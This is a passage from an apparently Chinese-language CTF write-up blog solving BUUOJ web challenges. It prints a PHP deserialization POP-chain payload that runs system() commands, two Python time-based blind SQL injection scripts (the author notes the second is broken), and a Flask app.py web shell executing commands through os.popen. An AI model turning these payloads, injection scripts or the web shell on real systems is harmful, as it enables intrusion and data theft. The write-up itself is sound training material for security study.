class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>);</span><br><span class="line">Fatal error: Uncaught <span class="built_in">Exception</span>: Nope in /<span class="keyword">var</span>/www/html/index.php:<span class="number">55</span> Stack trace: <span class="comment">#0 &#123;main&#125; thrown in /var/www/html/index.php on line 55</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POP链：__destruct()-&gt;__toString()-&gt;__get($var)-&gt;__invoke()-&gt;Web</span><br></pre></td></tr></table></figure><p>所以</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">class Start&#123;</span><br><span class="line">    public $errMsg;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Pwn&#123;</span><br><span class="line">    public $obj;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Reverse&#123;</span><br><span class="line">    public $func;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Web&#123;</span><br><span class="line">    public $func = &#x27;system&#x27;;</span><br><span class="line">    public $var = &#x27;ls /&#x27;;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Crypto&#123;</span><br><span class="line">    public $obj;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">class Misc&#123;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">$a = new Start();</span><br><span class="line">$a-&gt;errMsg = new Crypto();</span><br><span class="line">$a-&gt;errMsg-&gt;obj = new Reverse();</span><br><span class="line">$a-&gt;errMsg-&gt;obj-&gt;func = new Pwn();</span><br><span class="line">$a-&gt;errMsg-&gt;obj-&gt;func-&gt;obj = new Web();</span><br><span class="line">echo serialize($a);</span><br></pre></td></tr></table></figure><p>结果：</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9732ffc.png" alt="image-20240205180018670"></p><p>O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:4:”ls &#x2F;“;}}}}}</p><p>上传 仍报错</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa961ce7e.png" alt="image-20240205180134443"></p><p>这是因为代码里面扔了个异常</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa94d0ff3.png" alt="image-20240205180221381"></p><p>这会导致在反序列化之后直接经过异常报错 导致后边的析构函数__destruct()无法触发</p><p>所以需要Fast destruct</p><p>1.修改序列化数字元素个数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">改成</span><br><span class="line">O:5:&quot;Start&quot;:2:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a0dd13fd7.png" alt="image-20240205180429122"></p><p>O:5:”Start”:2:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}}</p><p><img src="https://bu.dusays.com/2024/05/13/6641630ea1d7a.png" alt="image-20240205180917410"></p><p><code> </code>flag{aa977e39-9133-4995-9ba1-a75aae77b57f}</p><p>2.去掉序列化尾部 }</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;&#125;</span><br><span class="line">改成</span><br><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:4:&quot;ls /&quot;;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641630e5aba2.png" alt="image-20240205181044938"></p><p>O:5:”Start”:1:{s:6:”errMsg”;O:6:”Crypto”:1:{s:3:”obj”;O:7:”Reverse”:1:{s:4:”func”;O:3:”Pwn”:1:{s:3:”obj”;O:3:”Web”:2:{s:4:”func”;s:6:”system”;s:3:”var”;s:7:”cat &#x2F;f*”;}}}}</p><p><img src="https://bu.dusays.com/2024/05/13/6641630eda87b.png" alt="image-20240205181123821"></p><p>flag{aa977e39-9133-4995-9ba1-a75aae77b57f}</p><h3 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h3><p><img src="https://bu.dusays.com/2024/05/13/6642328bd907b.png" alt="image-20240205182352427"></p><p>随便传一下</p><p>在url中发现id应该是注入点</p><p>被过滤</p><p><img src="https://bu.dusays.com/2024/05/13/6642328b53bcf.png" alt="image-20240205182849525"></p><p>union没过滤</p><p><img src="https://bu.dusays.com/2024/05/14/664379daadf67.png" alt="image-20240205182916033"></p><p>select没过滤</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9f64d10.png" alt="image-20240205182951444"></p><p>2‘也没有</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9e88e8d.png" alt="image-20240205183024376"></p><p>说明过滤了空格</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9f034f3.png" alt="image-20240205183131864"></p><p>没问题 无回显</p><p>用&#x2F;**&#x2F;代替空格</p><p>使用时间盲注来</p><p>脚本1：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line"><span class="comment"># from tqdm import trange</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;93af9711-9ca0-455a-977c-d562bb88a211.node4.buuoj.cn:81/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://93af9711-9ca0-455a-977c-d562bb88a211.node4.buuoj.cn:81/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">127</span>, <span class="number">31</span>, -<span class="number">1</span>):</span><br><span class="line">        url = <span class="string">r&#x27;http://93af9711-9ca0-455a-977c-d562bb88a211.node4.buuoj.cn:81/?id=&#x27;</span></span><br><span class="line">        <span class="comment"># payload = rf&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27; # information_schema,mysql,performance_schema,sys,test,ctf</span></span><br><span class="line">        <span class="comment"># payload = rf&#x27;1/**/and/**/if((ascii(substr((select/**/database()),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = rf&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/&quot;ctf&quot;),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = rf&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&quot;items&quot;),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27; # id,name,price</span></span><br><span class="line">        <span class="comment"># payload = rf&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        <span class="comment"># payload = rf&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(id,0x3a,name,0x3a,price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        payload = <span class="string">rf&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(name)/**/from/**/ctf.items),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;j&#125;</span>),sleep(4),0)&#x27;</span></span><br><span class="line">        url = url + payload</span><br><span class="line">        <span class="comment"># print(url)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(url=url, timeout=<span class="number">4</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            last = res</span><br><span class="line">            <span class="comment"># print(chr(j+1))</span></span><br><span class="line">            res += <span class="built_in">chr</span>(j + <span class="number">1</span>)</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] &#x27;</span> + res)</span><br></pre></td></tr></table></figure><p>脚本2：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,re,copy</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Gadget</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__enter__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__exit__</span>(<span class="params">self, exc_type, exc_val, exc_tb</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params">self,string:<span class="built_in">str</span></span>):</span><br><span class="line">        result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> string:</span><br><span class="line">            result += <span class="built_in">hex</span>(<span class="built_in">ord</span>(c))</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+result.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="comment"># index start from 1</span></span><br><span class="line">        <span class="comment">#注意要把脚本中的空格改成/**/</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">get_char_ascii</span>(<span class="params">self,string:<span class="built_in">str</span>,index</span>):</span><br><span class="line">            method1 = <span class="string">f&#x27;(Ord(right(left(<span class="subst">&#123;string&#125;</span>,<span class="subst">&#123;index&#125;</span>),1)))&#x27;</span></span><br><span class="line">            method2 = <span class="string">f&#x27;(Ord(substr(<span class="subst">&#123;string&#125;</span>/**/from/**/<span class="subst">&#123;index&#125;</span>/**/for/**/1)))&#x27;</span></span><br><span class="line">            method3 = <span class="string">f&#x27;(Ord(sUbstr(<span class="subst">&#123;string&#125;</span> frOm <span class="subst">&#123;index&#125;</span> fOr 1)))&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> method2</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">table_name_in_db</span>(<span class="params">self</span>):</span><br><span class="line">            s1 = <span class="string">&#x27;(Select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)/**/in/**/(dAtabase())))&#x27;</span> <span class="comment"># mysql &gt; 5.6</span></span><br><span class="line">            s2 = <span class="string">&#x27;(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)/**/in/**/(dAtabase())))&#x27;</span></span><br><span class="line">            s3 = <span class="string">&#x27;(Select(group_coNcat(table_name))frOm(infOrmation_schema.tables)wHere((table_schema)In(dAtabase())))&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> s3</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">table_name_in_db2</span>(<span class="params">self, schema_name</span>):</span><br><span class="line">            s1 = <span class="string">&#x27;(Select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)/**/in/**/(dAtabase())))&#x27;</span> <span class="comment"># mysql &gt; 5.6</span></span><br><span class="line">            s2 = <span class="string">&#x27;(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)/**/in/**/(dAtabase())))&#x27;</span></span><br><span class="line">            s3 = <span class="string">f&quot;(Select(group_coNcat(table_name))frOm(infOrmation_schema.tables)wHere((table_schema)In(&#x27;<span class="subst">&#123;schema_name&#125;</span>&#x27;)))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s3</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">db_names</span>(<span class="params">self</span>):</span><br><span class="line">            s1 = <span class="string">&#x27;(Select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)/**/in/**/(dAtabase())))&#x27;</span> <span class="comment"># mysql &gt; 5.6</span></span><br><span class="line">            s2 = <span class="string">&#x27;(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)/**/in/**/(dAtabase())))&#x27;</span></span><br><span class="line">            s3 = <span class="string">f&quot;(sElect(group_coNcat(sChema_name))from(information_schema.schemata))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s3</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">column_name_in_table</span>(<span class="params">self,table_name:<span class="built_in">str</span></span>):</span><br><span class="line">            s1 = <span class="string">f&quot;(select(group_concat(column_name))from(infOrmation_schema.columns)where(table_name)in(&#x27;<span class="subst">&#123;table_name&#125;</span>&#x27;))&quot;</span></span><br><span class="line">            s2 = <span class="string">f&quot;(sElect(group_cOncat(Column_name))frOm(infOrmation_schema.cOlumns)wHere(table_name)In(<span class="subst">&#123;self.str2hex(table_name)&#125;</span>))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s2</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">column_value_in_table</span>(<span class="params">self,table_name:<span class="built_in">str</span>,column_name:<span class="built_in">str</span></span>):</span><br><span class="line">            s1 = <span class="string">f&quot;(sElect(grOup_cOncat(<span class="subst">&#123;column_name&#125;</span>))frOm(<span class="subst">&#123;table_name&#125;</span>))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s1</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">get_len</span>(<span class="params">self,function,*args, **kwargs</span>):</span><br><span class="line">            s1 = <span class="string">f&#x27;(lenGth(<span class="subst">&#123;function(*args, **kwargs)&#125;</span>))&#x27;</span></span><br><span class="line">            <span class="keyword">return</span> s1</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">ascii_equal</span>(<span class="params">self,asc,i</span>):</span><br><span class="line">            s1 = <span class="string">f&quot;((<span class="subst">&#123;asc&#125;</span>)in(<span class="subst">&#123;i&#125;</span>))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s1</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">len_equal</span>(<span class="params">self,<span class="built_in">len</span>,i</span>):</span><br><span class="line">            s1 = <span class="string">f&quot;((<span class="subst">&#123;<span class="built_in">len</span>&#125;</span>)in(<span class="subst">&#123;i&#125;</span>))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s1</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">ascii_greater</span>(<span class="params">self,asc,i</span>):</span><br><span class="line">            s1 = <span class="string">f&quot;(leAst(<span class="subst">&#123;asc&#125;</span>,<span class="subst">&#123;i&#125;</span>)in(<span class="subst">&#123;i&#125;</span>))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s1</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">judge</span>(<span class="params">self,cond</span>):</span><br><span class="line">            s2 = <span class="string">f&quot;Elt((<span class="subst">&#123;cond&#125;</span>)+1,sLeep(1),0)&quot;</span></span><br><span class="line">            s1 = <span class="string">f&quot;(iF((<span class="subst">&#123;cond&#125;</span>),sLeep(1),0))&quot;</span></span><br><span class="line">            <span class="keyword">return</span> s1</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Injector</span>():</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,url,method,inject_param,data=<span class="literal">None</span>,debug=<span class="literal">True</span></span>):</span><br><span class="line">            self.url = url</span><br><span class="line">            self.method = method</span><br><span class="line">            self.data = data</span><br><span class="line">            self.inject_param = inject_param</span><br><span class="line">            self.debug = debug</span><br><span class="line">            self.gadget = Gadget()</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">condition</span>(<span class="params">self,res</span>):</span><br><span class="line">            <span class="keyword">if</span> res.elapsed.total_seconds()&gt;<span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">handle_value</span>(<span class="params">self,function, *args, **kwargs</span>):</span><br><span class="line">            result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            data = copy.deepcopy(self.data)</span><br><span class="line">            <span class="keyword">for</span> _time <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;time:%d&quot;</span> % (_time + <span class="number">1</span>))</span><br><span class="line">                left = <span class="number">32</span></span><br><span class="line">                right = <span class="number">128</span></span><br><span class="line">                updated = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">while</span> (right &gt; left):</span><br><span class="line">                    mid = (left + right) // <span class="number">2</span></span><br><span class="line">                    <span class="keyword">with</span> self.gadget <span class="keyword">as</span> g:</span><br><span class="line">                        data[self.inject_param] = self.data[self.inject_param].replace(<span class="string">&#x27;XXXXX&#x27;</span>,g.judge(g.ascii_equal(g.get_char_ascii(function(*args, **kwargs),_time+<span class="number">1</span>),mid)))</span><br><span class="line">                    res = <span class="literal">None</span></span><br><span class="line">                    <span class="keyword">if</span> self.method == <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">                        res = requests.get(self.url,data)</span><br><span class="line">                        <span class="keyword">if</span> self.debug:</span><br><span class="line">                            <span class="comment">#print(res.text)</span></span><br><span class="line">                            <span class="built_in">print</span>(res.request.url)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            res = requests.post(self.url,data)</span><br><span class="line">                            <span class="keyword">if</span> self.debug:</span><br><span class="line">                                <span class="built_in">print</span>(res.text)</span><br><span class="line">                        <span class="keyword">if</span> (self.condition(res)):</span><br><span class="line">                            result+=<span class="built_in">chr</span>(mid)</span><br><span class="line">                            <span class="built_in">print</span>(result)</span><br><span class="line">                            updated = <span class="literal">True</span></span><br><span class="line">                            <span class="keyword">break</span></span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            <span class="keyword">with</span> self.gadget <span class="keyword">as</span> g:</span><br><span class="line">                                data[self.inject_param] = self.data[self.inject_param].replace(<span class="string">&#x27;XXXXX&#x27;</span>,g.judge(g.ascii_greater(g.get_char_ascii(function(*args, **kwargs),_time+<span class="number">1</span>),mid)))</span><br><span class="line">                            res = <span class="literal">None</span></span><br><span class="line">                            <span class="keyword">if</span> self.method == <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">                                res = requests.get(self.url, data)</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                res = requests.post(self.url, data)</span><br><span class="line">                            <span class="keyword">if</span> (self.condition(res)):</span><br><span class="line">                                left = mid</span><br><span class="line">                            <span class="keyword">else</span>:</span><br><span class="line">                                right = mid</span><br><span class="line">                    <span class="keyword">if</span> <span class="keyword">not</span> updated :</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">handle_len</span>(<span class="params">self,function, *args, **kwargs</span>):</span><br><span class="line">                data = copy.deepcopy(self.data)</span><br><span class="line">                <span class="keyword">for</span> _time <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;time:%d&quot;</span> % (_time))</span><br><span class="line">                    <span class="keyword">with</span> self.gadget <span class="keyword">as</span> g:</span><br><span class="line">                        data[self.inject_param] =  self.data[self.inject_param].replace(<span class="string">&#x27;XXXXX&#x27;</span>,g.judge(g.len_equal(g.get_len(function,*args, **kwargs),_time)))</span><br><span class="line">                    res = <span class="literal">None</span></span><br><span class="line">                    <span class="keyword">if</span> self.method == <span class="string">&#x27;get&#x27;</span>:</span><br><span class="line">                        res = requests.get(self.url, data)</span><br><span class="line">                        <span class="keyword">if</span> self.debug:</span><br><span class="line">                            <span class="built_in">print</span>(res.request.url)</span><br><span class="line">                            <span class="built_in">print</span>(res.text)</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        res = requests.post(self.url, data)</span><br><span class="line">                        <span class="keyword">if</span> self.debug:</span><br><span class="line">                            <span class="built_in">print</span>(res.text)</span><br><span class="line">                    <span class="keyword">if</span> (self.condition(res)):</span><br><span class="line">                        <span class="built_in">print</span>(_time)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Note:</span></span><br><span class="line"><span class="string">    Use time-based injection by default.</span></span><br><span class="line"><span class="string">Todo:</span></span><br><span class="line"><span class="string">    union injection</span></span><br><span class="line"><span class="string">    bool injection</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    g = Gadget()</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://7e6750f1-d557-49a6-bea9-ecfe9513b376.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">    inject_param = <span class="string">&#x27;id&#x27;</span></span><br><span class="line">    <span class="comment"># XXXXX 会被替换为 if(,sleep(1.5),0)</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&quot;1/**/Or/**/XXXXX#&quot;</span>&#125;</span><br><span class="line">    inj = Injector(url,method=<span class="string">&#x27;get&#x27;</span>,inject_param=inject_param,data=data)</span><br><span class="line">    <span class="comment"># 获取数据库列表</span></span><br><span class="line">    <span class="comment">#inj.handle_value(g.db_names)</span></span><br><span class="line">    <span class="comment">#information_schema,mysql,performance_schema,sys,test,ctf</span></span><br><span class="line">    <span class="comment"># 根据数据库获取表名</span></span><br><span class="line">    <span class="comment">#inj.handle_value(g.table_name_in_db2, &#x27;ctf&#x27;)</span></span><br><span class="line">    <span class="comment">#items</span></span><br><span class="line">    <span class="comment"># 获取表的字段</span></span><br><span class="line">    <span class="comment">#inj.handle_value(g.column_name_in_table,&#x27;items&#x27;)</span></span><br><span class="line">    <span class="comment">#id,name,price</span></span><br><span class="line">    <span class="comment"># 最后取数据</span></span><br><span class="line">    inj.handle_value(g.column_value_in_table,<span class="string">&#x27;ctf.items&#x27;</span>,<span class="string">&#x27;name&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/664232872f5c0.png" alt="image-20240205192402524"></p><p>flag{9197eb45-96a5-45b5-807d-ac6db0c1163d}</p><p>第二个脚本报错：未解析的引用 ‘Injector’ 懵了 有这个类啊</p><p>找到问题了 是格式错了</p><p>又说我 未使用的 import 语句 ‘re’</p><p>还有’Gadget’ object has no attribute ‘column_value_in_table’</p><p>先这样吧</p><h3 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h3><p><img src="https://bu.dusays.com/2024/05/13/6641fa94cdba8.png" alt="image-20240218121532061"></p><p>list files:</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa94115ce.png" alt="image-20240218121615441"></p><p>upload files:</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9417710.png" alt="image-20240218121712990"></p><p>可以上传个什么东西</p><p>admin manage：</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa97dcfb6.png" alt="image-20240218121831105"></p><p>可以上传Pin码</p><p>要输入pin码，说明flask开启了debug模式。flask开启了debug模式下，app.py源文件被修改后会立刻加载。所以只需要上传一个能rce的app.py文件把原来的覆盖，就可以了</p><p>所以：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():    </span><br><span class="line">    <span class="keyword">try</span>:        </span><br><span class="line">        cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)        </span><br><span class="line">        data = os.popen(cmd).read()        </span><br><span class="line">        <span class="keyword">return</span> data    </span><br><span class="line">    <span class="keyword">except</span>:        </span><br><span class="line">        <span class="keyword">pass</span>    </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:    </span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>上传这个</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9430d58.png" alt="image-20240218130640300"></p><p><img src="https://bu.dusays.com/2024/05/13/6641fa94e23af.png" alt="image-20240218131653210"></p><p>直接命令执行</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa96c3ff6.png" alt="image-20240218131354399"></p><p>没回显</p><p>懵了</p><p>试了%20 不行</p><p>什么鬼</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa99efa18.png" alt="image-20240218132947482"></p><p><img src="https://bu.dusays.com/2024/05/13/6641fa9494d44.png" alt="image-20240218133447940"></p><p>文件名字问题 要把原来的app.py覆盖 要名字一样</p><h3 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h3><p><img src="https://bu.dusays.com/2024/05/13/6641fa9b90c12.png" alt="image-20240218144557506"></p><p>发现图片可以点击</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa944559c.png" alt="image-20240218153841220"></p><p><img src="https://bu.dusays.com/2024/05/13/6641fa97310ee.png" alt="image-20240218153916167"></p><p>110.jpg中有源码</p><p><img src="https://bu.dusays.com/2024/05/13/6641fa97928e0.png" alt="image-20240218154053380"></p><p>将..&#x2F;替代为空</p><p>且在download路由下</p><p>猜到运行文件，以及后面审计源码</p><figure class="highlight plaintext"><table><tr><td 